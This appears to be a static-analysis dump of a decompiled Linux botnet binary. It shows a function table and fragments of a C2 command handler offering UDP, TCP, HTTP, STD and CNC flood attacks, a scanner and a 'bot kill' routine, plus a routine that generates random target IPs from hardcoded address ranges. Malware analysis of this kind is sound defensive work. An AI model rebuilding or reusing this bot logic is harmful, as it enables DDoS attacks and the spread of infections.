frame_dummy                                       |0   |158     |0             |0           |
----------------------------------------------------------------------------------------------
strtol                                            |0   |154     |0             |0           |
----------------------------------------------------------------------------------------------
_24_d_2                                           |4   |162     |0             |0           |
----------------------------------------------------------------------------------------------
__syscall_rt_sigaction                            |1   |167     |0             |0           |
----------------------------------------------------------------------------------------------
__sigaddset                                       |0   |159     |0             |0           |
----------------------------------------------------------------------------------------------
dup2                                              |0   |164     |0             |0           |
----------------------------------------------------------------------------------------------
chdir                                             |0   |164     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_execve                                       |0   |172     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_write                                      |2   |166     |0             |0           |
----------------------------------------------------------------------------------------------
__errno_location                                  |0   |154     |0             |0           |
----------------------------------------------------------------------------------------------
================================================================================
========	FUNCTIONS SUSPECTED INSTRUNCTIONS : ===================================
================================================================================
=================FUNCTION : processCmd ===================
++++++++ FUNCTION START 14157
++++++++ FUNCTION END 17427
++++++++ FUNCTION LENGTH 3270
    if (__GI_strcoll((char *)*a2, (int32_t)"PING") == 0) {
        sockprintf(v146, (int32_t)"PONG!");
            getdtablesize();
            sockprintf(v146, (int32_t)"%d");
                    kill();
                    sockprintf(v146, (int32_t)"STOPPING SCANNER");
                        int32_t v150 = __libc_fork(); // 0x10894
                            __GI_inet_ntoa(v147);
                            sockprintf(v146, (int32_t)"STARTING SCANNER ON -> %s");
                if (listFork() == 0) {
                    __GI_inet_ntoa(v147);
                    botkiller(sockprintf(v146, (int32_t)"COMMENCING BOT KILL ON -> %s"));
            if (__GI_strcoll((char *)*a2, (int32_t)"GETPUBLICIP") == 0) {
                __GI_inet_ntoa(v147);
                sockprintf(v146, (int32_t)"My Public IP: %s");
                if (__GI_strcoll((char *)*a2, (int32_t)"UDP") == 0) {
                                                            return sockprintf(v146, (int32_t)"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>");
                                                        int32_t v168 = listFork(); // 0x10cf8
                                                            sendUDP(v167, v157, v158, v159, v160, v161, v163, v165);
                                                            while (true) {
                                                                if (listFork() == 0) {
                                                                    sendUDP(v169, v157, v158, v159, v160, v161, v163, v165);
                    sockprintf(v146, (int32_t)"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>");
                    if (__GI_strcoll((char *)*a2, (int32_t)"TCP") == 0) {
                                                    result2 = sockprintf(v146, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)");
                                                    result2 = sockprintf(v146, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)");
                                                if (listFork() == 0) {
                                                    sendTCP(v221, v214, v215, v216, v222, v219, v217);
                                                    while (true) {
                                                        if (listFork() == 0) {
                                                            sendTCP(v223, v214, v215, v216, v222, v219, v217);
                                                    if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                                if (listFork() == 0) {
                                                                    sendHTTP(*v171, v196, (char)(v175 % 0x10000), v198, v176, v177);
                                                                    while (true) {
                                                                        if (listFork() == 0) {
                                                                            sendHTTP(*v171, v191, (char)(v172 % 0x10000), v193, v173, v174);
                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"HTTPFLOOD") != 0) {
                                                                                                v228 = listFork();
                                                                                                    sendSTD(v207, v189, v190, 0);
                                                                                                    while (true) {
                                                                                                        if (listFork() != 0) {
                                                                                                        sendSTD(v208, v189, v190, 0);
                                                                                                if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                    while (true) {
                                                                                result = sockprintf(v146, (int32_t)"STD <target> <port> <time>");
                                                                                if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                    while (true) {
                                                                                        result3 = listFork();
                                                                                            sendCNC(v205, v185, v186, 0);
                                                                                        while (true) {
                                                                                            if (listFork() != 0) {
                                                                                            sendCNC(v206, v185, v186, 0);
                                                                                            __libc_close(v146);
                                                                                                        v228 = listFork();
                                                                                                            sendSTD(v207, v189, v190, 0);
                                                                                                            while (true) {
                                                                                                                if (listFork() != 0) {
                                                                                                                sendSTD(v208, v189, v190, 0);
                                                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                            while (true) {
                                                                                        result = sockprintf(v146, (int32_t)"STD <target> <port> <time>");
                                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                            while (true) {
                                                                        result4 = sockprintf(v146, (int32_t)"CNC <target> <port> <time>");
                                                                                int32_t v231 = listFork(); // 0x112a0
                                                                                    sendHTTP2(v201, v202, (char)(v180 % 0x10000), v203, v181, v182);
                                                                                                            v228 = listFork();
                                                                                                                sendSTD(v207, v189, v190, 0);
                                                                                                                while (true) {
                                                                                                                    if (listFork() != 0) {
                                                                                                                    sendSTD(v208, v189, v190, 0);
                                                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                while (true) {
                                                                                            result = sockprintf(v146, (int32_t)"STD <target> <port> <time>");
                                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                while (true) {
                                                                                                    result3 = listFork();
                                                                                                        sendCNC(v205, v185, v186, 0);
                                                                                                                        v228 = listFork();
                                                                                                                            sendSTD(v207, v189, v190, 0);
                                                                                                                            while (true) {
                                                                                                                                if (listFork() != 0) {
                                                                                                                                sendSTD(v208, v189, v190, 0);
                                                                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                            while (true) {
                                                                                                        result = sockprintf(v146, (int32_t)"STD <target> <port> <time>");
                                                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                            while (true) {
                                                                                                while (true) {
                                                                                                    if (listFork() == 0) {
                                                                                                        sendCNC(v232, v185, v186, 0);
                                                                                                        __libc_close(v146);
                                                                                                                    v228 = listFork();
                                                                                                                        sendSTD(v207, v189, v190, 0);
                                                                                                                        while (true) {
                                                                                                                            if (listFork() == 0) {
                                                                                                                                sendSTD(v234, v189, v190, 0);
                                                                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                            while (true) {
                                                                                                                                            sockprintf(v146, (int32_t)"None Killed.");
                                                                                                                                            sockprintf(v146, (int32_t)"Killed %d.");
                                                                                                                                    if (*v238 != __libc_getpid()) {
                                                                                                                                        kill();
                                                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                        while (true) {
                                                                                                    result = sockprintf(v146, (int32_t)"STD <target> <port> <time>");
                                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                        while (true) {
                                                                                    result4 = sockprintf(v146, (int32_t)"CNC <target> <port> <time>");
                                                                if (__GI_strcoll((char *)*a2, (int32_t)"HTTPFLOOD") == 0) {
                                                                                if (listFork() == 0) {
                                                                                    sendHTTP2(v201, v202, (char)(v180 % 0x10000), v203, v181, v182);
                                                                                                        if (listFork() == 0) {
                                                                                                            sendCNC(v205, v185, v186, 0);
                                                                                                            while (true) {
                                                                                                                if (listFork() != 0) {
                                                                                                                sendCNC(v206, v185, v186, 0);
                                                                                                                __libc_close(v146);
                                                                                                                            if (listFork() == 0) {
                                                                                                                                sendSTD(v207, v189, v190, 0);
                                                                                                                                while (true) {
                                                                                                                                    if (listFork() != 0) {
                                                                                                                                    sendSTD(v208, v189, v190, 0);
                                                                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                while (true) {
                                                                                                            sockprintf(v146, (int32_t)"STD <target> <port> <time>");
                                                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                while (true) {
                                                                                        sockprintf(v146, (int32_t)"CNC <target> <port> <time>");
                                                                                                            if (listFork() == 0) {
                                                                                                                sendSTD(v207, v189, v190, 0);
                                                                                                                while (true) {
                                                                                                                    if (listFork() != 0) {
                                                                                                                    sendSTD(v208, v189, v190, 0);
                                                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                while (true) {
                                                                                            sockprintf(v146, (int32_t)"STD <target> <port> <time>");
                                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                while (true) {
                                                                                        if (listFork() == 0) {
                                                                                            sendCNC(v205, v185, v186, 0);
                                                                                            while (true) {
                                                                                                if (listFork() != 0) {
                                                                                                sendCNC(v206, v185, v186, 0);
                                                                                                __libc_close(v146);
                                                                                                            if (listFork() == 0) {
                                                                                                                sendSTD(v207, v189, v190, 0);
                                                                                                                while (true) {
                                                                                                                    if (listFork() != 0) {
                                                                                                                    sendSTD(v208, v189, v190, 0);
                                                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                while (true) {
                                                                                            sockprintf(v146, (int32_t)"STD <target> <port> <time>");
                                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                while (true) {
                                                                        sockprintf(v146, (int32_t)"CNC <target> <port> <time>");
                                                                                            if (listFork() == 0) {
                                                                                                sendSTD(v207, v189, v190, 0);
                                                                                                while (true) {
                                                                                                    if (listFork() != 0) {
                                                                                                    sendSTD(v208, v189, v190, 0);
                                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                while (true) {
                                                                            sockprintf(v146, (int32_t)"STD <target> <port> <time>");
                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                while (true) {
                                                        if (__GI_strcoll((char *)*a2, (int32_t)"HTTPFLOOD") == 0) {
                                                                        if (listFork() == 0) {
                                                                            sendHTTP2(v201, v202, (char)(v180 % 0x10000), v203, v181, v182);
                                                                                                if (listFork() == 0) {
                                                                                                    sendCNC(v205, v185, v186, 0);
                                                                                                    while (true) {
                                                                                                        if (listFork() != 0) {
                                                                                                        sendCNC(v206, v185, v186, 0);
                                                                                                        __libc_close(v146);
                                                                                                                    if (listFork() == 0) {
                                                                                                                        sendSTD(v207, v189, v190, 0);
                                                                                                                        while (true) {
                                                                                                                            if (listFork() != 0) {
                                                                                                                            sendSTD(v208, v189, v190, 0);
                                                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                        while (true) {
                                                                                                    sockprintf(v146, (int32_t)"STD <target> <port> <time>");
                                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                        while (true) {
                                                                                sockprintf(v146, (int32_t)"CNC <target> <port> <time>");
                                                                                                    if (listFork() == 0) {
                                                                                                        sendSTD(v207, v189, v190, 0);
                                                                                                        while (true) {
                                                                                                            if (listFork() != 0) {
                                                                                                            sendSTD(v208, v189, v190, 0);
                                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                        while (true) {
                                                                                    sockprintf(v146, (int32_t)"STD <target> <port> <time>");
                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                        while (true) {
                                                                                if (listFork() == 0) {
                                                                                    sendCNC(v205, v185, v186, 0);
                                                                                    while (true) {
                                                                                        if (listFork() != 0) {
                                                                                        sendCNC(v206, v185, v186, 0);
                                                                                        __libc_close(v146);
                                                                                                    if (listFork() == 0) {
                                                                                                        sendSTD(v207, v189, v190, 0);
                                                                                                        while (true) {
                                                                                                            if (listFork() != 0) {
                                                                                                            sendSTD(v208, v189, v190, 0);
                                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                        while (true) {
                                                                                    sockprintf(v146, (int32_t)"STD <target> <port> <time>");
                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                        while (true) {
                                                                sockprintf(v146, (int32_t)"CNC <target> <port> <time>");
                                                                                    if (listFork() == 0) {
                                                                                        sendSTD(v207, v189, v190, 0);
                                                                                        while (true) {
                                                                                            if (listFork() != 0) {
                                                                                            sendSTD(v208, v189, v190, 0);
                                                                    sockprintf(v146, (int32_t)"STD <target> <port> <time>");
                                            if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                        if (listFork() == 0) {
                                                            sendHTTP(*v171, v196, (char)(v175 % 0x10000), v198, v176, v177);
                                                            while (true) {
                                                                if (listFork() != 0) {
                                                                sendHTTP(*v171, v191, (char)(v172 % 0x10000), v193, v173, v174);
                                                        if (__GI_strcoll((char *)*a2, (int32_t)"HTTPFLOOD") == 0) {
                                                                        if (listFork() == 0) {
                                                                            sendHTTP2(v201, v202, (char)(v180 % 0x10000), v203, v181, v182);
                                                                                                if (listFork() == 0) {
                                                                                                    sendCNC(v205, v185, v186, 0);
                                                                                                    while (true) {
                                                                                                        if (listFork() != 0) {
                                                                                                        sendCNC(v206, v185, v186, 0);
                                                                                                        __libc_close(v146);
                                                                                                                    if (listFork() == 0) {
                                                                                                                        sendSTD(v207, v189, v190, 0);
                                                                                                                        while (true) {
                                                                                                                            if (listFork() != 0) {
                                                                                                                            sendSTD(v208, v189, v190, 0);
                                                                                                    sockprintf(v146, (int32_t)"STD <target> <port> <time>");
                                                                                sockprintf(v146, (int32_t)"CNC <target> <port> <time>");
                                                                                                    if (listFork() == 0) {
                                                                                                        sendSTD(v207, v189, v190, 0);
                                                                                                        while (true) {
                                                                                                            if (listFork() != 0) {
                                                                                                            sendSTD(v208, v189, v190, 0);
                                                                                    sockprintf(v146, (int32_t)"STD <target> <port> <time>");
                                                                                if (listFork() == 0) {
                                                                                    sendCNC(v205, v185, v186, 0);
                                                                                    while (true) {
                                                                                        if (listFork() != 0) {
                                                                                        sendCNC(v206, v185, v186, 0);
                                                                                        __libc_close(v146);
                                                                                                    if (listFork() == 0) {
                                                                                                        sendSTD(v207, v189, v190, 0);
                                                                                                        while (true) {
                                                                                                            if (listFork() != 0) {
                                                                                                            sendSTD(v208, v189, v190, 0);
                                                                                    sockprintf(v146, (int32_t)"STD <target> <port> <time>");
                                                                sockprintf(v146, (int32_t)"CNC <target> <port> <time>");
                                                                                    if (listFork() == 0) {
                                                                                        sendSTD(v207, v189, v190, 0);
                                                                                        while (true) {
                                                                                            if (listFork() != 0) {
                                                                                            sendSTD(v208, v189, v190, 0);
                                                                    sockprintf(v146, (int32_t)"STD <target> <port> <time>");
                                                if (__GI_strcoll((char *)*a2, (int32_t)"HTTPFLOOD") == 0) {
                                                                if (listFork() == 0) {
                                                                    sendHTTP2(v201, v202, (char)(v180 % 0x10000), v203, v181, v182);
                                                                                        if (listFork() == 0) {
                                                                                            sendCNC(v205, v185, v186, 0);
                                                                                            while (true) {
                                                                                                if (listFork() != 0) {
                                                                                                sendCNC(v206, v185, v186, 0);
                                                                                                __libc_close(v146);
                                                                                                            if (listFork() == 0) {
                                                                                                                sendSTD(v207, v189, v190, 0);
                                                                                                                while (true) {
                                                                                                                    if (listFork() != 0) {
                                                                                                                    sendSTD(v208, v189, v190, 0);
                                                                                            sockprintf(v146, (int32_t)"STD <target> <port> <time>");
                                                                        sockprintf(v146, (int32_t)"CNC <target> <port> <time>");
                                                                                            if (listFork() == 0) {
                                                                                                sendSTD(v207, v189, v190, 0);
                                                                                                while (true) {
                                                                                                    if (listFork() != 0) {
                                                                                                    sendSTD(v208, v189, v190, 0);
                                                                            sockprintf(v146, (int32_t)"STD <target> <port> <time>");
                                                                        if (listFork() == 0) {
                                                                            sendCNC(v205, v185, v186, 0);
                                                                            while (true) {
                                                                                if (listFork() != 0) {
                                                                                sendCNC(v206, v185, v186, 0);
                                                                                __libc_close(v146);
                                                                                            if (listFork() == 0) {
                                                                                                sendSTD(v207, v189, v190, 0);
                                                                                                while (true) {
                                                                                                    if (listFork() != 0) {
                                                                                                    sendSTD(v208, v189, v190, 0);
                                                                            sockprintf(v146, (int32_t)"STD <target> <port> <time>");
                                                        sockprintf(v146, (int32_t)"CNC <target> <port> <time>");
                                                                            if (listFork() == 0) {
                                                                                sendSTD(v207, v189, v190, 0);
                                                                                while (true) {
                                                                                    if (listFork() != 0) {
                                                                                    sendSTD(v208, v189, v190, 0);
                                                            sockprintf(v146, (int32_t)"STD <target> <port> <time>");
                        sockprintf(v146, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)");
                        if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                    if (listFork() == 0) {
                                        sendHTTP(*v171, v196, (char)(v175 % 0x10000), v198, v176, v177);
                                        while (true) {
                                            if (listFork() != 0) {
                                            sendHTTP(*v171, v191, (char)(v172 % 0x10000), v193, v173, v174);
                                    if (__GI_strcoll((char *)*a2, (int32_t)"HTTPFLOOD") == 0) {
                                                    if (listFork() == 0) {
                                                        sendHTTP2(v201, v202, (char)(v180 % 0x10000), v203, v181, v182);
                                                                            if (listFork() == 0) {
                                                                                sendCNC(v205, v185, v186, 0);
                                                                                while (true) {
                                                                                    if (listFork() != 0) {
                                                                                    sendCNC(v206, v185, v186, 0);
                                                                                    __libc_close(v146);
                                                                                                if (listFork() == 0) {
                                                                                                    sendSTD(v207, v189, v190, 0);
                                                                                                    while (true) {
                                                                                                        if (listFork() != 0) {
                                                                                                        sendSTD(v208, v189, v190, 0);
                                                                                sockprintf(v146, (int32_t)"STD <target> <port> <time>");
                                                            sockprintf(v146, (int32_t)"CNC <target> <port> <time>");
                                                                                if (listFork() == 0) {
                                                                                    sendSTD(v207, v189, v190, 0);
                                                                                    while (true) {
                                                                                        if (listFork() != 0) {
                                                                                        sendSTD(v208, v189, v190, 0);
                                                                sockprintf(v146, (int32_t)"STD <target> <port> <time>");
                                                            if (listFork() == 0) {
                                                                sendCNC(v205, v185, v186, 0);
                                                                while (true) {
                                                                    if (listFork() != 0) {
                                                                    sendCNC(v206, v185, v186, 0);
                                                                    __libc_close(v146);
                                                                                if (listFork() == 0) {
                                                                                    sendSTD(v207, v189, v190, 0);
                                                                                    while (true) {
                                                                                        if (listFork() != 0) {
                                                                                        sendSTD(v208, v189, v190, 0);
                                                                sockprintf(v146, (int32_t)"STD <target> <port> <time>");
                                            sockprintf(v146, (int32_t)"CNC <target> <port> <time>");
                                                                if (listFork() == 0) {
                                                                    sendSTD(v207, v189, v190, 0);
                                                                    while (true) {
                                                                        if (listFork() != 0) {
                                                                        sendSTD(v208, v189, v190, 0);
                                                sockprintf(v146, (int32_t)"STD <target> <port> <time>");
                            if (__GI_strcoll((char *)*a2, (int32_t)"HTTPFLOOD") == 0) {
                                            if (listFork() == 0) {
                                                sendHTTP2(v201, v202, (char)(v180 % 0x10000), v203, v181, v182);
                                                                    if (listFork() == 0) {
                                                                        sendCNC(v205, v185, v186, 0);
                                                                        while (true) {
                                                                            if (listFork() != 0) {
                                                                            sendCNC(v206, v185, v186, 0);
                                                                            __libc_close(v146);
                                                    sockprintf(v146, (int32_t)"CNC <target> <port> <time>");
                                                    if (listFork() == 0) {
                                                        sendCNC(v205, v185, v186, 0);
                                                        while (true) {
                                                            if (listFork() != 0) {
                                                            sendCNC(v206, v185, v186, 0);
                                                            __libc_close(v146);
                                    sockprintf(v146, (int32_t)"CNC <target> <port> <time>");
=================FUNCTION : GetRandomPublicIP ===================
++++++++ FUNCTION START 9011
++++++++ FUNCTION END 10416
++++++++ FUNCTION LENGTH 1405
    random();
    random();
    v152 = random() % 255;
    v153 = random() % 255;
    int32_t v154 = random() % 208; // 0xab54
        szprintf(v151, (int32_t)"112.5.%d.%d", (int32_t)v152, (int32_t)v153, 0);
        szprintf(v151, (int32_t)"117.165.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"85.3.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"37.158.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"95.9.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"41.252.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"58.71.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"104.55.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"78.186.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"78.189.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"221.120.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"88.5.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"41.254.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"103.20.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"103.47.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"103.57.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"45.117.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"101.51.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"137.59.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"1.56.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"1.188.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"14.204.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"27.0.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"27.8.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"27.50.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"27.54.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"27.98.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"27.112.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"27.192.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"36.32.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"36.248.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"39.64.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"42.4.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"42.48.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"42.52.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"42.56.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"42.63.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"42.84.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"42.176.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"42.224.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"42.176.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"43.253.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"43.230.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"163.53.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"43.230.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"62.252.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"43.245.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"62.255.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"123.25.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"103.54.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"27.255.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"103.204.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"123.24.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"113.191.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"81.100.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"113.188.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"113.189.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"94.174.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"14.160.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"14.161.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"14.162.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"14.163.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"14.164.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"14.165.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"14.166.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"14.167.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"14.168.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"14.169.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"14.170.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"14.171.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"14.172.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"14.173.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"14.174.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"14.175.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"14.176.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"14.177.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"14.178.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"14.179.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"14.180.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"14.181.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"14.182.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"14.183.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"14.184.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"14.185.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"14.186.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"14.187.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"14.188.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"14.189.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"14.190.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
        szprintf(v151, (int32_t)"14.191.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);
